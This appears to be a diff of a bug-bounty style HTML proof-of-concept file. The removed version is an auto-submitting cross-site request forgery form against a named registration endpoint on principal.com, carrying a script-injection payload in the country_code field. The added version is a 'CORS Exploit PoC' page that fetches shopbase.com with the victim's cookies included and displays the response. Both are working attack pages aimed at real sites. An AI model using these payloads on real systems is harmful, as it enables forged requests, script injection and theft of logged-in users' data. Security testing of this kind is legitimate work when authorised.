@@ -1,10 +1,25 @@
-<html><form enctype="application/x-www-form-urlencoded" method="POST" action="https://secure05.principal.com/enterprise/registration/"><table><tr><td>first_name</td><td><input type="text" value="Yunxo" name="first_name"></td></tr>
-<tr><td>last_name</td><td><input type="text" value="limbu" name="last_name"></td></tr>
-<tr><td>date_of_birth</td><td><input type="text" value="07/07/2009" name="date_of_birth"></td></tr>
-<tr><td>phone_number</td><td><input type="text" value="986-324234" name="phone_number"></td></tr>
-<tr><td>country_code</td><td><input type="text" value='test"></scRIpt><scRIpt>alert(3)</scRIpt>' name="country_code"></td></tr>
-<tr><td>id_number</td><td><input type="text" value="" name="id_number"></td></tr>
-<tr><td>postal_code</td><td><input type="text" value="" name="postal_code"></td></tr>
-<tr><td>econsent</td><td><input type="text" value="on" name="econsent"></td></tr>
-<tr><td>winnie</td><td><input type="text" value="" name="winnie"></td></tr>
-</table><input type="submit" value="https://secure05.principal.com/enterprise/registration/"></form><scRIpt>document.forms[0].submit();</scRIpt></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>CORS PoC</h1>
+  <pre id="output">Loading...</pre>
+
+  <script>
+    fetch('https://www.shopbase.com', {
+      method: 'GET',
+      credentials: 'include' // Important if you want cookies to be sent
+    })
+    .then(response => response.text())
+    .then(data => {
+      document.getElementById('output').textContent = data;
+    })
+    .catch(error => {
+      document.getElementById('output').textContent = 'Error: ' + error;
+    });
+  </script>
+</body>
+</html>
